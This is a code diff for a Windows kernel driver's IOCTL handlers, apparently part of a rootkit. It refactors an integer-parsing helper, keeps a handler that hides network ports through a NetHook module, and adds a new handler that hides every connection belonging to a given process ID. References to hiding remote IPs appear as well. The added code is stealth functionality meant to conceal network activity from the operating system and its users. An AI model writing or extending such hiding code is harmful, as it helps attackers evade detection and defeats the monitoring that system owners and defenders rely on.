@@ -56,9 +56,9 @@ NTSTATUS IoctlHandlers::HandleTestConnection(_In_ PIRP Irp, _In_ const size_t Bu
 	return status;
 }
 
-static NTSTATUS NetAddHiddenPortFromIrp(
-	_In_ PIRP Irp)
-{	
+static NTSTATUS NetRetrieveIntegerFromIrp(
+	_In_ PIRP Irp, _Out_ ULONG& ret)
+{
 	PCSZ inputBuf = (PCSZ)(Irp->AssociatedIrp.SystemBuffer);
 	ASSERT(inputBuf != nullptr);
 
@@ -67,28 +67,24 @@ static NTSTATUS NetAddHiddenPortFromIrp(
 	RtlInitAnsiString(&pidAnsiString, inputBuf);
 	RtlAnsiStringToUnicodeString(&pidUnicodeString, &pidAnsiString, TRUE);
 
-	KdPrint(("HIDE_PORT-Port Unicode String: %wZ\n", &pidUnicodeString));
+	KdPrint(("Input Value(Unicode String): %wZ\n", &pidUnicodeString));
 
-	ULONG port{ 0 };
-	NTSTATUS status = RtlUnicodeStringToInteger(&pidUnicodeString, 10, &port);
+	ULONG value{ 0 };
+	NTSTATUS status = RtlUnicodeStringToInteger(&pidUnicodeString, 10, &value);
 	if (!NT_SUCCESS(status))
 	{
-		KdPrint(("HIDE_PORT-Failed to convert Port to Integer Value: status[0x%X]\n", status));
+		KdPrint(("Failed to convert [%wZ] to Integer Value: Status[0x%X]\n", &pidUnicodeString, status));
 		return STATUS_INVALID_PARAMETER;
 	}
 
-	if (port == 0)
+	if (value == 0)
 	{
-		KdPrint(("HIDE_PORT-Failed to convert Port to Integer Value\n"));
+		KdPrint(("Failed to convert Port to Integer Value\n"));
 		return STATUS_INVALID_PARAMETER;
 	}
 
-	NetHook::NETHOOK_HIDDEN_CONNECTION hiddenConnection{};
-	hiddenConnection.Port = (USHORT)port;
-
-	NetHook::NetAddHiddenConnection(&hiddenConnection);
-	return status;
-
+	ret = value;
+	return STATUS_SUCCESS;
 }
 
 NTSTATUS  IoctlHandlers::HandleHidePort(
@@ -106,7 +102,18 @@ NTSTATUS  IoctlHandlers::HandleHidePort(
 
 	KdPrint(("Input Buffer Length:%d\n", InputBufferLength));
 	KdPrint(("InputPort:%s\n", (char*)Irp->AssociatedIrp.SystemBuffer));
-	NTSTATUS status{ NetAddHiddenPortFromIrp(Irp) };
+
+	ULONG port{ 0 };
+	NTSTATUS status{ NetRetrieveIntegerFromIrp(Irp, port) };
+	if (!NT_SUCCESS(status))
+	{
+		KdPrint(("Error:[%s] Invalid Value\n", __FUNCTION__));
+		return status;
+	}
+
+	NetHook::NETHOOK_HIDDEN_CONNECTION hiddenConnection{};
+	hiddenConnection.Port = (USHORT)port;
+	NetHook::NetAddHiddenConnection(&hiddenConnection);
 
 	Irp->IoStatus.Status = status;
 	Irp->IoStatus.Information = 0;
@@ -157,4 +164,37 @@ NTSTATUS IoctlHandlers::HandleHideRemoteIP(
 	Irp->IoStatus.Status = STATUS_SUCCESS;
 	Irp->IoStatus.Information = 0;
 	return STATUS_SUCCESS;
+}
+
+NTSTATUS  IoctlHandlers::HandleConnectPID(
+	_In_ PIRP Irp,
+	_In_ const size_t InputBufferLength)
+{
+	if (InputBufferLength == 0)
+	{
+		KdPrint(("Invalid Length:%d\n", InputBufferLength));
+
+		Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
+		Irp->IoStatus.Information = 0;
+		return STATUS_INVALID_PARAMETER;
+	}
+
+	KdPrint(("Input Buffer Length:%d\n", InputBufferLength));
+	KdPrint(("Input PID:%s\n", (char*)Irp->AssociatedIrp.SystemBuffer));
+
+	ULONG pid{ 0 };
+	NTSTATUS status{ NetRetrieveIntegerFromIrp(Irp, pid) };
+	if (!NT_SUCCESS(status))
+	{
+		KdPrint(("Error:[%s] Invalid Value\n", __FUNCTION__));
+		return status;
+	}
+
+	NetHook::NETHOOK_HIDDEN_CONNECTION hiddenConnection{};
+	hiddenConnection.ConnectPID = pid;
+	NetHook::NetAddHiddenConnection(&hiddenConnection);
+
+	Irp->IoStatus.Status = status;
+	Irp->IoStatus.Information = 0;
+	return status;
 }
